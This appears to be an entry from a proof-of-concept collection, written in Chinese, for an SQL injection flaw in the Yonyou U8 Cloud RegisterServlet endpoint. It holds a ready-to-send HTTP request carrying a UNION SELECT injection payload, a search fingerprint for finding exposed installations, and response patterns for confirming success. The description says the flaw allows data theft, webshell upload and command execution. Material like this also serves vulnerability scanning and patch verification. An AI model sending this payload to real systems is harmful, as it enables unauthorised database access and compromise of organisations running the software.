﻿# 用友U8-nc.bs.sm.login2.RegisterServlet SQL注入漏洞

> 更新时间：2024-03-28

> 漏洞编号：

> 漏洞说明：用友U8 Cloud nc.bs.sm.login2.RegisterServlet接口存在SQL注入，黑客可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。

> 漏洞特征：app="用友-U8-Cloud"

> 验证脚本：HTTP

```
GET /servlet/~uap/nc.bs.sm.login2.RegisterServlet?usercode=1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,@@version,NULL,NULL,NULL,NULL--%20Jptd HTTP/1.1
Cookie: JSESSIONID=D523370AE42E1D2363160250C914E62A.server

```

> 响应代码特征：200

> 响应内容特征：^(?=.*?invalid)(?=.*?Error).*?$

> 上传文件定位：

> 验证文件来源：用友U8-nc.bs.sm.login2.RegisterServlet SQL注入漏洞.poc

